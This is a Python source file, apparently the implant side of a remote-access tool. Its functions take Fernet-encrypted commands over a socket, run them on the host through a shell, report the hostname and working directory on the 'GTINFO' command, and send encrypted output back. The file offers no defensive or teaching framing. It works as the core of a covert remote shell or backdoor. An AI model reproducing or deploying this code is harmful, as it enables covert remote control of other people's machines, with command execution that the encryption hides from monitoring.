from os import chdir,path,getcwd
import socket
from select import select
from time import sleep
from cryptography.fernet import Fernet
from subprocess import check_output,STDOUT
def shellRN(conn,key):
    conn.settimeout(600)
    def decryptFS(dataBorS):
        if not type(dataBorS)==bytes:
            dataBorS=str(dataBorS).encode()
        if dataBorS:
            Eobj=Fernet(key)
            res=Eobj.decrypt(dataBorS)
            return res
        else:
            raise AttributeError
    def encryptFS(dataBorS):
        if not type(dataBorS)==bytes:
            dataBorS=str(dataBorS).encode()
        if dataBorS:
            Eobj=Fernet(key)
            res=Eobj.encrypt(dataBorS)
            return res
        else:
            raise AttributeError
    while 1:
        try:
            command=decryptFS(conn.recv(1024)).decode().strip()
        except AttributeError:
            continue
        if command=="GTINFO":
            conn.sendall(encryptFS(f"{socket.gethostname()}[{getcwd()}]"))
        elif "END" in command:
            break
        elif command[0:2]=="cd":
            path=command.strip().split(" ")
            if len(command)==2:
                conn.send(encryptFS(f"So where?"))
            else :
                try:
                    chdir(command[2:].strip())
                    conn.send(encryptFS("None"))
                except :
                    conn.send(encryptFS(f"cd: {command[2:].strip()}: No such file or directory"))
        else:
            if "bash" in command:
                conn.sendall(encryptFS("What do you want from me ?!"))
            else :
                try:
                    out=check_output(command,stderr=STDOUT,shell=True)
                except Exception as e:
                    out =e
                try:
                    conn.sendall(encryptFS(out))
                except AttributeError:
                    conn.sendall(encryptFS("None"))
def commandRunner(conn,command,key):
    while 1:
        sleep(0.25)
        if command=="RMCM":
            shellRN(conn,key)
            conn.send(b"END")
            break
        else :
            break